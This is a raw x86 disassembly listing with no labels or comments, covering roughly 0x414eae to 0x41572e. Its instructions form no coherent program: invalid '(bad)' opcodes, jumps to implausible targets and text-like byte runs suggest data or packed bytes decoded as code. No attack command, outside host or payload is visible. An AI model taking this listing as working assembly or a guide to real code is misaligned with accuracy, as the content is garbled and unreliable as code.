  414eae:	add    eax,0xff04655d
  414eb3:	jae    0x414eb5
  414eb5:	or     bh,bl
  414eb7:	dec    ebp
  414eb8:	jb     0x414ec7
  414eba:	or     al,0x62
  414ebc:	add    BYTE PTR ds:0x4675d04,cl
  414ec2:	inc    DWORD PTR [edx]
  414ec4:	das    
  414ec5:	sbb    BYTE PTR [ebp+ebx*1+0x5d01d300],dh
  414ecc:	outs   dx,BYTE PTR ds:[esi]
  414ecd:	sar    dl,0x61
  414ed0:	jb     0x414ebb
  414ed2:	xlat   BYTE PTR ds:[ebx]
  414ed3:	outs   dx,BYTE PTR gs:[esi]
  414ed5:	into   
  414ed6:	shl    BYTE PTR [ecx+0x0],0xd1
  414eda:	lds    ebx,FWORD PTR [esi+ebp*2-0x38]
  414ede:	int3   
  414edf:	add    ch,BYTE PTR [edi-0x38]
  414ee2:	scas   al,BYTE PTR es:[edi]
  414ee3:	ja     0x414f56
  414ee5:	mov    eax,ds:0x995f5aa4
  414eea:	xchg   esp,eax
  414eeb:	jne    0x414eed
  414eed:	test   BYTE PTR [ebp-0x737f8d8a],al
  414ef3:	add    dh,BYTE PTR [eax-0x78]
  414ef6:	xchg   edi,eax
  414ef7:	jae    0x414ef9
  414ef9:	mov    BYTE PTR [eax],al
	...
  414f0f:	test   DWORD PTR [ebp+0x5f],ecx
  414f12:	mov    BYTE PTR [ebp-0x3f4bc9fe],al
  414f18:	xor    esi,DWORD PTR [edx]
  414f1a:	sbb    BYTE PTR [ebx+0x45486b4d],ah
  414f20:	pop    di
  414f22:	jmp    0x41b5ae6d
  414f27:	jb     0x414f85
  414f29:	add    BYTE PTR gs:[esi+0x696e6558],bh
  414f30:	pop    ebx
  414f31:	jb     0x414f33
  414f33:	arpl   WORD PTR [ecx+0x74],sp
  414f36:	push   0x7300746b
  414f3b:	nop
  414f3c:	popa   
  414f3d:	imul   esi,DWORD PTR [eax-0x39],0x6
  414f41:	push   0x65
  414f43:	mov    ebp,0x9f636575
  414f48:	push   es
  414f49:	jae    0x414fb0
  414f4b:	mov    dl,0x65
  414f4d:	imul   ebp,DWORD PTR [ebp-0x55],0x6
  414f51:	jo     0x414fc2
  414f53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f54:	pop    ebx
  414f55:	imul   ebp,DWORD PTR [edi+0x70],0x516c6501
  414f5c:	imul   esp,DWORD PTR [ecx+0x79],0x71
  414f60:	push   0x2d
  414f62:	add    BYTE PTR [edi-0x50ced2c9],bh
  414f68:	push   es
  414f69:	imul   esi,DWORD PTR [ebp+0xd],0x696e5d75
  414f70:	add    DWORD PTR [eax+0x65],ebp
	...
  414f87:	add    BYTE PTR [edx+0x71],ah
  414f8a:	imul   esp,DWORD PTR [ebp+0x3e],0xa73714f
  414f91:	dec    esi
  414f92:	outs   dx,BYTE PTR ds:[esi]
  414f93:	add    BYTE PTR [esi+eiz*2],dh
  414f96:	outs   dx,DWORD PTR ds:[esi]
  414f97:	ins    DWORD PTR es:[edi],dx
  414f98:	daa    
  414f99:	arpl   WORD PTR [ecx+0x0],sp
  414f9c:	xchg   ecx,eax
  414f9d:	ja     0x414ffc
  414f9f:	outs   dx,BYTE PTR ds:[esi]
  414fa0:	sbb    DWORD PTR [edx+0x0],ebx
  414fa3:	je     0x414fd0
  414fa5:	je     0x41501b
  414fa7:	imul   esp,DWORD PTR [eax],0x6e610058
  414fad:	jno    0x41501b
  414faf:	gs (bad) 
  414fb1:	popa   
  414fb2:	arpl   WORD PTR gs:[esi+0x5b],si
  414fb6:	ins    BYTE PTR es:[edi],dx
  414fb7:	ins    BYTE PTR es:[edi],dx
  414fb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fb9:	ds add al,0x70
  414fbc:	dec    edx
  414fbd:	cmp    ah,BYTE PTR [ebp+0x63]
  414fc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fc1:	sub    BYTE PTR [edi+0x61],ah
  414fc4:	xor    eax,0x76007846
  414fc9:	fld    TBYTE PTR [edx+0x72]
  414fcc:	inc    esi
  414fcd:	cmp    BYTE PTR [edi+0x0],ah
  414fd0:	xor    BYTE PTR [edx],dl
  414fd2:	pusha  
  414fd3:	ins    BYTE PTR es:[edi],dx
  414fd4:	push   cs
  414fd5:	sti    
  414fd6:	pop    esi
  414fd7:	add    BYTE PTR [esi],cl
  414fd9:	push   es
  414fda:	popa   
  414fdb:	jbe    0x414fe7
  414fdd:	adc    esp,DWORD PTR [ecx+0x73]
  414fe0:	aad    0xd9
  414fe2:	pop    edi
  414fe3:	addr16 add al,0xfd
  414fe6:	pop    edi
  414fe7:	arpl   WORD PTR [edi+0x3637ab],sp
	...
  415001:	mov    ecx,0xfa0037b3
  415006:	into   
  415007:	addr16 data16 into 
  41500a:	mov    ebx,0xcdc66501
  41500f:	push   0x1d2c675
  415014:	data16 sar BYTE PTR [eax-0x492f88a2],cl
  41501b:	xor    al,0x0
  41501d:	(bad)  
  41501e:	test   al,0x76
  415020:	push   0x68adc0
  415025:	mov    edi,0x8f5f597a
  41502a:	jp     0x41502d
  41502c:	jo     0x414fb6
  41502e:	test   BYTE PTR [ecx+0x0],dh
  415031:	test   DWORD PTR [ebp+0x68],ebp
  415034:	jno    0x414fca
  415036:	xchg   edx,eax
  415037:	pop    edi
  415038:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41503a:	ja     0x415099
  41503c:	pop    edi
  41503d:	(bad)  
  41503e:	ja     0x41509d
  415040:	pop    edi
  415041:	jg     0x41501c
  415043:	pusha  
  415044:	ja     0x4150ba
  415046:	add    dl,BYTE PTR [edi+0x63]
  415049:	inc    esi
  41504a:	sbb    BYTE PTR gs:[esp+ecx*2],al
  41504e:	popa   
  41504f:	pop    ebx
  415050:	js     0x415091
  415052:	gs push esi
  415054:	add    al,0x46
  415056:	popa   
  415057:	push   ebp
  415058:	arpl   WORD PTR [ebx+0x61],cx
  41505b:	out    0x74,eax
  41505d:	inc    eax
  41505e:	pop    esi
  41505f:	cmp    eax,0x39023567
  415064:	popa   
	...
  415079:	add    BYTE PTR [ebp+0x65],al
  41507c:	sbb    DWORD PTR [eax-0x59],edi
  41507f:	fs push cs
  415081:	jbe    0x415087
  415083:	jne    0x415091
  415085:	jbe    0x41502e
  415087:	popa   
  415088:	sbb    ch,BYTE PTR [eax+0x1]
  41508b:	fs (bad) 
  41508e:	cmc    
  41508f:	popa   
  415090:	or     bl,BYTE PTR [esp+eax*1+0x5f]
  415094:	out    0x75,eax
  415096:	rcr    BYTE PTR [ecx-0x3],1
  415099:	gs cli 
  41509b:	jae    0x415084
  41509d:	push   0x62d359d4
  4150a2:	aad    0x2
  4150a4:	xlat   BYTE PTR ds:[ebx]
  4150a5:	lock pop sp
  4150a8:	aam    0x77
  4150aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150ab:	pusha  
  4150ac:	enter  0xcc77,0x61
  4150b0:	int    0x3
  4150b2:	(bad)  
  4150b3:	pop    ebx
  4150b4:	(bad)  
  4150b5:	pop    esp
  4150b6:	enter  0xe765,0x65
  4150ba:	enter  0x9359,0x66
  4150be:	cwde   
  4150bf:	add    bl,BYTE PTR [edx-0x73a079a0]
  4150c5:	jne    0x415087
  4150c7:	add    bh,BYTE PTR [edx+ebx*2-0x7a]
  4150cb:	push   edi
  4150cc:	mov    WORD PTR [edx-0x59],gs
  4150cf:	pusha  
  4150d0:	nop
  4150d1:	ja     0x415057
  4150d3:	pop    ebp
  4150d4:	add    BYTE PTR [esp+eiz*4+0x487d635a],cl
  4150db:	pop    ebp
  4150dc:	das    
  4150dd:	jmp    0x4150e2
	...
  4150f2:	add    BYTE PTR [ecx+0x57],cl
  4150f5:	addr16 dec edi
  4150f7:	inc    eax
  4150f8:	push   edi
  4150f9:	add    BYTE PTR [ebp+0x44],cl
  4150fc:	pop    ecx
  4150fd:	ins    DWORD PTR es:[edi],dx
  4150fe:	push   ebp
  4150ff:	inc    esp
  415100:	add    dh,BYTE PTR [ecx+0x48]
  415103:	pusha  
  415104:	dec    ebx
  415105:	outs   dx,BYTE PTR ds:[esi]
  415106:	xor    eax,0x4a004b5b
  41510b:	inc    esi
  41510c:	push   edi
  41510d:	jo     0x415157
  41510f:	xor    al,0x2
  415111:	adc    BYTE PTR fs:[esi+ebx*2],al
  415115:	ins    DWORD PTR es:[edi],dx
  415116:	(bad)  
  415117:	lsl    esi,WORD PTR [eax+ecx*1-0x4]
  41511c:	push   esi
  41511d:	ins    DWORD PTR es:[edi],dx
  41511e:	sbb    esp,DWORD PTR [ebx-0x60492a0]
  415124:	pop    ebp
  415125:	add    BYTE PTR [ebx],dl
  415127:	push   es
  415128:	pop    ebx
  415129:	outs   dx,BYTE PTR ds:[esi]
  41512a:	mov    edx,0xfb0030b5
  41512f:	int    0x63
  415131:	push   0x5edac8
  415136:	retf   
  415137:	clc    
  415138:	popa   
  415139:	outs   dx,BYTE PTR ds:[esi]
  41513a:	ret    0x2a95
  41513d:	xor    ch,cl
  41513f:	aam    0x65
  415141:	pop    edi
  415142:	retf   0x65dc
  415145:	jno    0x415130
  415147:	ret    
  415148:	push   edi
  415149:	ins    DWORD PTR es:[edi],dx
  41514a:	lds    esp,FWORD PTR [eax+eiz*2+0x65afbe6c]
  415151:	jb     0x41513c
  415153:	fwait
  415154:	arpl   WORD PTR [ebp-0x72],bp
	...
  41516b:	add    BYTE PTR [eax-0x75168d9b],dl
  415171:	dec    ecx
  415172:	outs   dx,BYTE PTR ds:[esi]
  415173:	mov    BYTE PTR [esi+0x14000049],al
  415179:	imul   esp,DWORD PTR gs:[ebp+0x7d],0x22735d05
  415181:	pop    esp
  415182:	pop    ebp
  415183:	jae    0x4151a7
  415185:	pop    esp
  415186:	add    BYTE PTR [esi+0x77],dh
  415189:	gs je  0x4151fb
  41518c:	jl     0x4151e5
  41518e:	add    BYTE PTR [ecx+ebp*2+0x48],ch
  415192:	outs   dx,DWORD PTR fs:[esi]
  415194:	mov    dh,bh
  415196:	sub    al,0x32
  415198:	mov    ebp,0xce65736e
  41519d:	xor    dh,BYTE PTR cs:[ebx]
  4151a0:	lods   eax,DWORD PTR ds:[esi]
  4151a1:	xor    ebp,DWORD PTR ds:0x5d6a6d00
  4151a7:	jb     0x41516b
  4151a9:	je     0x41520c
  4151ab:	imul   ecx,DWORD PTR [esi-0x53909ea0],0x61
  4151b2:	popa   
  4151b3:	add    BYTE PTR [ecx-0x4c9191b9],dh
  4151b9:	je     0x4151bb
  4151bb:	ins    DWORD PTR es:[edi],dx
  4151bc:	scas   eax,DWORD PTR es:[edi]
  4151bd:	popa   
  4151be:	arpl   WORD PTR [ecx-0x5d],bp
  4151c1:	(bad)  
  4151c2:	jae    0x415236
  4151c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151c5:	dec    eax
  4151c6:	gs je  0x415210
  4151c9:	add    eax,0x466a6e6b
  4151ce:	outs   dx,BYTE PTR ds:[esi]
  4151cf:	add    BYTE PTR gs:[eax],al
	...
  4151e2:	add    BYTE PTR [eax],al
  4151e4:	add    BYTE PTR [esi],bh
  4151e6:	xor    dh,BYTE PTR cs:[ebx]
  4151e9:	pop    edi
  4151ea:	arpl   WORD PTR [edi+0x0],bx
  4151ed:	ins    DWORD PTR es:[edi],dx
  4151ee:	dec    ebp
  4151ef:	arpl   WORD PTR gs:[ebp+0x5a],dx
  4151f3:	outs   dx,BYTE PTR ds:[esi]
  4151f4:	add    BYTE PTR [edx+ebp*2+0x6e],ah
  4151f8:	imul   ebp,ecx,0x36630072
  4151fe:	jae    0x415265
  415200:	jae    0x415210
  415202:	jne    0x415261
  415204:	jae    0x4151ad
  415206:	mov    WORD PTR [esi+0x30],?
  415209:	xchg   ebp,eax
  41520a:	jg     0x41520d
  41520c:	pop    edi
  41520d:	jp     0x41527b
  41520f:	jne    0x415278
  415211:	mov    ebx,ebx
  415213:	jb     0x415285
  415215:	xchg   BYTE PTR [ebp+0x5a],ch
  415218:	ja     0x4151c1
  41521a:	jp     0x415281
  41521c:	imul   ecx,DWORD PTR [esi+0x51],0x4
  415220:	imul   eax,DWORD PTR [edx+0x4d],0x60
  415224:	addr16 inc ecx
  415226:	(bad)  [esi+0x6d]
  415229:	cmp    BYTE PTR [eax+0x60],al
  41522c:	arpl   WORD PTR [edi+0x42677239],sp
  415232:	cmp    DWORD PTR [eax+0x71],ebp
  415235:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415236:	inc    ebx
  415237:	pop    ebp
  415238:	jo     0x41527c
  41523a:	(bad)  [edx+0x68]
  41523d:	push   es
  41523e:	push   cs
  41523f:	pop    ebp
  415240:	imul   esp,DWORD PTR [edi+0x1b6e5af7],0xfffffff7
  415247:	pop    ebp
  415248:	add    BYTE PTR fs:[eax],al
	...
  41525b:	add    BYTE PTR [eax],al
  41525d:	add    al,bh
  41525f:	fstp   DWORD PTR [ebp+0x6d]
  415262:	adc    BYTE PTR ds:0xda006e5b,dl
  415268:	pop    ecx
  415269:	pop    edi
  41526a:	cmc    
  41526b:	std    
  41526c:	data16 ja 0x415216
  41526f:	in     al,dx
  415270:	pusha  
  415271:	ins    DWORD PTR es:[edi],dx
  415272:	int3   
  415273:	mov    dh,0x6c
  415275:	add    BYTE PTR [eax-0x58cacaf0],dl
  41527b:	ret    
  41527c:	pop    esi
  41527d:	jno    0x415241
  41527f:	leave  
  415280:	pop    ecx
  415281:	add    bl,dl
  415283:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415284:	bound  ebp,QWORD PTR [ecx-0x42]
  415287:	fldenv [ebp+0x67]
  41528a:	enter  0x75c2,0x5f
  41528e:	mov    ebx,0x9b0064d9
  415293:	add    cl,BYTE PTR [edi-0x7ba17688]
  415299:	jno    0x415242
  41529b:	jae    0x415234
  41529d:	pop    esp
  41529e:	xchg   ebp,eax
  41529f:	pop    ecx
  4152a0:	xchg   ebx,eax
  4152a1:	add    eax,DWORD PTR [ebp-0x7f986a9f]
  4152a7:	outs   dx,BYTE PTR ds:[esi]
  4152a8:	out    0x68,eax
  4152aa:	sub    DWORD PTR [esi-0x74],0x7d61a771
  4152b1:	ja     0x415302
  4152b3:	push   edi
  4152b4:	push   ebp
  4152b5:	imul   esp,DWORD PTR [edi+0x59724e63],0x5d
  4152bc:	pop    ebx
  4152bd:	js     0x415303
  4152bf:	add    bh,BYTE PTR [edi]
  4152c1:	pop    ebp
	...
  4152d6:	add    BYTE PTR [esi+0x5b],al
  4152d9:	dec    esp
  4152da:	imul   esp,DWORD PTR [edi+0x44754e72],0x74
  4152e1:	out    0x61,eax
  4152e3:	inc    esp
  4152e4:	pop    eax
  4152e5:	inc    ecx
  4152e6:	arpl   WORD PTR [edx+ebx*2],cx
  4152e9:	adc    eax,0xe570004
  4152ee:	jbe    0x4152f4
  4152f0:	push   0x6
  4152f2:	ja     0x41529c
  4152f4:	add    bl,al
  4152f6:	jb     0x4152ad
  4152f8:	outs   dx,DWORD PTR ds:[esi]
  4152f9:	mov    edx,0x1070a766
  4152fe:	je     0x415304
  415300:	jne    0x4152e9
  415302:	fs add al,0x59
  415305:	add    al,0x71
  415307:	enter  0xe773,0x58
  41530b:	leave  
  41530c:	pop    ecx
  41530d:	(bad)  
  41530e:	pop    ebx
  41530f:	fild   DWORD PTR [edx]
  415311:	fdiv   DWORD PTR [esp+eax*8+0x74]
  415315:	shr    DWORD PTR [edx-0x70],cl
  415318:	add    cl,dl
  41531a:	jno    0x4152e0
  41531c:	popa   
  41531d:	mov    bl,0x5a
  41531f:	mov    ecx,0xc2e9005d
  415324:	push   ebp
  415325:	ins    DWORD PTR es:[edi],dx
  415326:	retf   
  415327:	test   DWORD PTR [eax+eax*1-0x78],esi
  41532b:	sbb    BYTE PTR [edi+0x64],0x88
  41532f:	xchg   edi,eax
  415330:	add    dh,BYTE PTR [edx-0x7a]
  415333:	nop
  415334:	pop    edi
  415335:	imul   eax,DWORD PTR [eax-0x77938e5c],0x0
	...
  415350:	lea    esp,[ebx+0x72]
  415353:	jmp    0x8db2b2d3
  415358:	dec    ebx
  415359:	pop    ebx
  41535a:	add    BYTE PTR [ecx+0x56],bh
  41535d:	inc    edi
  41535e:	addr16 pop edx
  415360:	inc    eax
  415361:	add    bh,BYTE PTR [edx+0x61]
  415364:	inc    esi
  415365:	jo     0x4153c9
  415367:	inc    edi
  415368:	push   0x60487102
  41536d:	jae    0x4153d2
  41536f:	push   ebp
  415370:	mov    ds:0x4852675b,eax
  415375:	add    ah,BYTE PTR [eax+ecx*2+0x47]
  415379:	push   esi
  41537a:	pop    edi
  41537b:	cmp    ch,BYTE PTR [ebx+0xc725f]
  415381:	push   ebp
  415382:	add    BYTE PTR ds:0x1d747408,dl
  415388:	add    BYTE PTR [esp+esi*2-0x17],dh
  41538c:	loope  0x4153d3
  41538e:	jbe    0x41539c
  415390:	cmc    
  415391:	pop    ebp
  415392:	popa   
  415393:	adc    ch,BYTE PTR [ebx+0x70c6e57]
  415399:	pop    eax
  41539a:	jbe    0x4153a0
  41539c:	stos   DWORD PTR es:[edi],eax
  41539d:	pop    esi
  41539e:	pop    edi
  41539f:	(bad)  
  4153a1:	pop    esi
  4153a2:	add    ah,cl
  4153a4:	mov    ebp,0xc1df6d56
  4153a9:	add    ah,BYTE PTR [ecx-0x3f]
  4153ac:	mov    ecx,0x56006170
  4153b1:	add    ah,BYTE PTR [esi+0x72]
	...
  4153c8:	add    BYTE PTR [edi+0x5d],dl
  4153cb:	outs   dx,BYTE PTR ds:[esi]
  4153cc:	fs ds pop edi
  4153cf:	imul   esp,DWORD PTR [esi+ecx*1+0x5e],0x61
  4153d4:	jae    0x415410
  4153d6:	dec    ecx
  4153d7:	outs   dx,BYTE PTR ds:[esi]
  4153d8:	jns    0x4153d8
  4153da:	inc    edi
  4153db:	imul   ebp,DWORD PTR [esi+0x1b],0x2
  4153df:	imul   ebp,DWORD PTR [ecx+0x2d],0x11736b74
  4153e6:	pusha  
  4153e7:	je     0x4153e9
  4153e9:	sub    al,0x34
  4153eb:	xor    dh,BYTE PTR [edx]
  4153ed:	sub    al,0x34
  4153ef:	add    BYTE PTR [edx+0x5b],ah
  4153f2:	arpl   WORD PTR [edx+0x6c],sp
  4153f5:	imul   ebp,DWORD PTR [ebp+0x0],0x31
  4153f9:	scas   eax,DWORD PTR es:[edi]
  4153fa:	das    
  4153fb:	sub    eax,0x2d2faf31
  415400:	add    BYTE PTR [ebp+0x49],ch
  415403:	pop    edi
  415404:	popa   
  415405:	ins    DWORD PTR es:[edi],dx
  415406:	dec    ecx
  415407:	ins    BYTE PTR es:[edi],dx
  415408:	popa   
  415409:	mov    esi,0x5a726b47
  41540e:	pop    edi
  41540f:	outs   dx,BYTE PTR ds:[esi]
  415410:	xor    bl,BYTE PTR [ebp-0x4e939aff]
  415416:	jo     0x415479
  415418:	addr16 mov eax,ds:0x62
  41541c:	mov    ax,ds:0xaf627449
  415422:	dec    edx
  415423:	ins    BYTE PTR es:[edi],dx
  415424:	xor    DWORD PTR [esi-0x688994b3],ecx
  41542a:	dec    eax
  41542b:	arpl   WORD PTR [eax],ax
	...
  415441:	add    BYTE PTR [eax-0x50978ba1],ah
  415447:	dec    eax
  415448:	add    BYTE PTR [ebp+0x73],ah
  41544b:	dec    edx
  41544c:	pop    ebp
  41544d:	outs   dx,BYTE PTR ds:[esi]
  41544e:	jnp    0x4154b2
  415450:	ins    BYTE PTR es:[edi],dx
  415451:	add    BYTE PTR [edi-0x2f929938],ah
  415457:	mov    ecx,0xa6c1006c
  41545c:	imul   ax,ax,0x5fbd
  415461:	add    BYTE PTR [edx+edi*4-0x246194a8],dh
  415468:	pop    eax
  415469:	pop    edi
  41546a:	lahf   
  41546b:	test   BYTE PTR [eax+0x6c],ah
  41546e:	sbb    ebx,0x5b
  415471:	pop    edi
  415472:	xchg   esp,eax
  415473:	jl     0x4154cc
  415475:	add    BYTE PTR [ebp-0x5891a69c],cl
  41547b:	stos   BYTE PTR es:[edi],al
  41547c:	je     0x4154b0
  41547e:	js     0x415428
  415480:	pusha  
  415481:	xor    al,0x75
  415483:	(bad)  [ebx+0x5f]
  415486:	inc    ebp
  415487:	jb     0x41548a
  415489:	jb     0x4154cd
  41548b:	aaa    
  41548c:	xor    esi,DWORD PTR [edx]
  41548e:	xchg   esp,eax
  41548f:	(bad)  [ebx+0x6c]
  415492:	inc    esi
  415493:	cmp    DWORD PTR [eax+0x5f],ebx
  415496:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415497:	dec    ebx
  415498:	jbe    0x415501
  41549a:	dec    ecx
  41549b:	cmp    BYTE PTR [edi+0x0],bl
  41549e:	ss sub al,0x5f
  4154a1:	jb     0x4154d6
  4154a3:	(bad)  [esi+0x68]
	...
  4154ba:	add    BYTE PTR [edx],cl
  4154bc:	es jne 0x415522
  4154bf:	push   es
  4154c0:	fidiv  DWORD PTR [eax]
  4154c2:	xor    ebx,edx
  4154c4:	into   
  4154c5:	xor    BYTE PTR [eax],al
  4154c7:	push   es
  4154c8:	cld    
  4154c9:	pusha  
  4154ca:	arpl   WORD PTR [ebx],dx
  4154cc:	retf   
  4154cd:	add    DWORD PTR [eax+0x6],ebp
  4154d0:	call   0xe841b632
  4154d5:	pusha  
  4154d6:	add    BYTE PTR [ebx],al
  4154d8:	imul   DWORD PTR [ebx+0x74]
  4154db:	retf   0x1e7
  4154de:	jno    0x4154a6
  4154e0:	add    bl,ch
  4154e2:	pusha  
  4154e3:	retf   
  4154e4:	add    bl,BYTE PTR [eax]
  4154e6:	xor    eax,0x371a3095
  4154eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154ec:	pop    edx
  4154ed:	enter  0xcb57,0x53
  4154f1:	out    0x5d,eax
  4154f3:	shr    BYTE PTR [edi-0x49],1
  4154f6:	pusha  
  4154f7:	mov    ch,0x2
  4154f9:	retf   
  4154fa:	fs xchg ecx,eax
  4154fc:	pop    ecx
  4154fd:	les    edx,FWORD PTR [edi-0x75]
  415500:	pop    ebp
  415501:	out    0x5e,eax
  415503:	mov    BYTE PTR [esi-0x6d],ch
  415506:	pusha  
  415507:	jns    0x41550b
  415509:	mov    ah,BYTE PTR [esi+esi*2+0x6f]
  41550d:	and    BYTE PTR [eax-0x59],0x6f
  415511:	jnp    0x415573
  415513:	adc    DWORD PTR [esi-0x78],0x3
  415517:	ja     0x415589
  415519:	mov    BYTE PTR [esp+eax*2+0x70],ch
  41551d:	out    0x5b,eax
	...
  415533:	add    BYTE PTR [edx+0x6e],cl
  415536:	dec    ebx
  415537:	pop    ecx
  415538:	dec    edx
  415539:	add    dl,BYTE PTR [esi+0x5b]
  41553c:	cmp    DWORD PTR [esi+0x46],ebx
  41553f:	jno    0x415577
  415541:	add    bh,BYTE PTR [edi+ebp*2]
  415544:	outs   dx,BYTE PTR ss:[esi]
  415546:	dec    ebx
  415547:	pop    ebx
  415548:	inc    esp
  415549:	add    al,BYTE PTR [esi+0x63]
  41554c:	xor    ebx,DWORD PTR [ebp+0x3a]
  41554f:	add    al,0x5
  415551:	pop    edx
  415552:	cmp    ebx,DWORD PTR [eax+0x2]
  415555:	bound  ebx,QWORD PTR [ebx]
  415557:	pop    edi
  415558:	push   ss
  415559:	add    eax,DWORD PTR [esi]
  41555b:	pop    esp
  41555c:	add    eax,0xa75a1b5f
  415561:	pop    ebx
  415562:	add    eax,0x14580d5c
  415567:	add    al,0xc0
  415569:	xor    BYTE PTR [edx+0x2cb42f],bh
  41556f:	mov    esi,0xe9302b8c
  415574:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415575:	pop    edi
  415576:	je     0x41555a
  415578:	fisubr DWORD PTR [ecx+ebp*2-0x32]
  41557c:	rcl    BYTE PTR [ebp+esi*2-0x24],cl
  415580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415581:	pop    edx
  415582:	je     0x415559
  415584:	mov    ah,0x28
  415586:	sub    eax,0x756db616
  41558b:	pinsrw mm2,WORD PTR [esi+0x62],0xcc
  415590:	call   0x6d61:0xbec0685d
  415597:	xchg   esp,eax
	...
  4155ac:	add    dl,al
  4155ae:	sub    dh,BYTE PTR [eax]
  4155b0:	loope  0x415586
  4155b2:	adc    eax,0x6b5e8670
  4155b7:	sub    eax,0x636e8586
  4155bc:	xlat   BYTE PTR ds:[ebx]
  4155bd:	je     0x415619
  4155bf:	jo     0x4155aa
  4155c1:	dec    esp
  4155c2:	outs   dx,BYTE PTR ds:[esi]
  4155c3:	je     0x41563e
  4155c5:	xchg   edx,eax
  4155c6:	adc    eax,0x6b498b2d
  4155cb:	pop    edi
  4155cc:	push   edi
  4155cd:	inc    edi
  4155ce:	jno    0x41563b
  4155d0:	push   eax
  4155d1:	outs   dx,DWORD PTR ds:[esi]
  4155d2:	pop    edi
  4155d3:	cs dec eax
  4155d5:	aaa    
  4155d6:	push   ebp
  4155d7:	imul   ecx,DWORD PTR [edx+0x5f],0x5b
  4155db:	popa   
  4155dc:	push   edx
  4155dd:	lea    esp,[ecx+0x6d]
  4155e0:	add    edi,DWORD PTR [ebx+0x32]
  4155e3:	cmp    cl,bh
  4155e5:	mov    edi,0xc3f6d52
  4155ea:	xor    BYTE PTR [ebp+0x8],ah
  4155ed:	pop    ss
  4155ee:	cs sbb bx,bp
  4155f2:	push   edx
  4155f3:	add    cl,ch
  4155f5:	fcom   QWORD PTR [esi+0x74]
  4155f8:	sbb    ecx,ecx
  4155fa:	das    
  4155fb:	sub    eax,0x73537100
  415600:	mov    eax,cs:0x1c657465
  415606:	arpl   WORD PTR [ebp+0x79],bx
  415609:	lods   eax,DWORD PTR ds:[esi]
  41560a:	pop    eax
  41560b:	imul   esp,DWORD PTR [ecx+0x72],0x3d
  41560f:	pop    ebp
  415610:	add    BYTE PTR cs:[eax],al
	...
  415623:	add    BYTE PTR [eax],al
  415625:	add    BYTE PTR [ebp+0x3b],bl
  415628:	imul   ebp,DWORD PTR [edi],0x4b52180b
  41562e:	sahf   
  41562f:	cmp    esi,DWORD PTR [ebx]
  415631:	inc    esp
  415632:	cdq    
  415633:	pop    ss
  415634:	bound  ebp,QWORD PTR [edx+0x5c]
  415637:	push   ebp
  415638:	cs gs push esi
  41563b:	inc    ecx
  41563c:	add    BYTE PTR [eax+0x52],ch
  41563f:	jb     0x4156b1
  415641:	cmp    bh,cl
  415643:	cli    
  415644:	pop    esi
  415645:	ins    BYTE PTR es:[edi],dx
  415646:	aaa    
  415647:	cmp    al,0x65
  415649:	arpl   WORD PTR [edi],bp
  41564b:	cmp    DWORD PTR [ebp+0x72],ebx
  41564e:	adc    bh,BYTE PTR ds:0x38d8736e
  415654:	popa   
  415655:	fsub   DWORD PTR fs:[edi+0x72]
  415659:	das    
  41565a:	push   ss
  41565b:	and    BYTE PTR [edx+0x75],cl
  41565e:	xor    dl,BYTE PTR [ebp+0x6a]
  415661:	push   ebx
  415662:	mov    ecx,0xb14a6752
  415667:	aaa    
  415668:	dec    esi
  415669:	xor    DWORD PTR [edi-0x8],ebx
  41566c:	pusha  
  41566d:	js     0x4156d2
  41566f:	push   es
  415670:	push   0x3a567274
  415675:	das    
  415676:	cdq    
  415677:	push   esp
  415678:	pop    ebp
  415679:	ins    BYTE PTR es:[edi],dx
  41567a:	fidivr WORD PTR [esi]
  41567c:	jo     0x4156df
  41567e:	fidivr DWORD PTR [ebx]
  415680:	popa   
  415681:	jb     0x4156fb
  415683:	imul   ebp,DWORD PTR fs:[esi],0xffffffb5
  415687:	arpl   WORD PTR [ebx],bp
  415689:	dec    edx
	...
  41569e:	add    BYTE PTR [edi-0x10999cdf],ah
  4156a4:	adc    eax,0x31c05174
  4156a9:	xor    edi,DWORD PTR [eax]
  4156ab:	loop   0x4156a4
  4156ad:	push   ebx
  4156ae:	push   ebx
  4156af:	xchg   ecx,eax
  4156b0:	push   cs
  4156b1:	ins    BYTE PTR es:[edi],dx
  4156b2:	arpl   WORD PTR [edi-0x21acb315],sp
  4156b8:	fwait
  4156b9:	dec    esi
  4156ba:	inc    esp
  4156bb:	loope  0x41564f
  4156bd:	xor    eax,0x50927743
  4156c2:	inc    edi
  4156c3:	xlat   BYTE PTR ds:[ebx]
  4156c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156c5:	cmp    eax,0x4097de46
  4156ca:	xor    dh,cl
  4156cc:	jbe    0x41570a
  4156ce:	inc    ecx
  4156cf:	jne    0x415743
  4156d1:	push   ecx
  4156d2:	push   esp
  4156d3:	bound  esp,QWORD PTR [edi-0x6d85a8cf]
  4156d9:	xor    al,0x2e
  4156db:	xlat   BYTE PTR ds:[ebx]
  4156dc:	jmp    0x4156df
  4156de:	add    BYTE PTR [edi+0x6affffeb],ah
  4156e4:	cmp    BYTE PTR ds:0x1eaa653,0x0
  4156eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156ec:	jmp    0x4156ef
  4156ee:	add    BYTE PTR [edi+0x614d52eb],ah
  4156f4:	ja     0x415744
  4156f6:	aas    
  4156f7:	jne    0x415727
  4156f9:	dec    eax
  4156fa:	dec    ebx
  4156fb:	ds dec esp
  4156fd:	jb     0x41576c
  4156ff:	xor    al,0x48
  415701:	pop    esi
  415702:	je     0x415704
	...
  415718:	pop    ebx
  415719:	sbb    BYTE PTR [ebx+0x6e],bl
  41571c:	dec    ebx
  41571d:	cmp    BYTE PTR [ebp+0x71],ch
  415720:	dec    ebx
  415721:	sub    al,0x6f
  415723:	jb     0x41573a
  415725:	dec    edi
  415726:	push   esi
  415727:	je     0x41571a
  415729:	inc    esi
  41572a:	jb     0x41579d
  41572c:	inc    BYTE PTR [edx]
  41572e:	push   ss
